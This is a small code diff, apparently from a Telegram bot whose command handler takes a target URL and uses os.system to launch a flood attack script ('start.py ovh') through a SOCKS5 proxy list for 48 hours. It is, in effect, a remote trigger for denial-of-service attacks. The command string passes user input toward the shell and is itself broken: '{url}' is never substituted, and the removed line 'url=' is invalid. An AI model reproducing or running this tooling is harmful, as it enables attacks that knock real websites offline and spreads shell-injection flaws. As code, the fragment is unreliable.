@@ -10,7 +10,6 @@ def start(update, context):
 def a1(update, context):
         url = context.args[0]
         update.message.reply_text(f"started")
-        url=
         os.system('python start.py ovh {url} 1 250 socks5.txt 100 172800')
         zkm = open('2.txt', 'r').read()
         update.message.reply_text(f"A1 is free now")
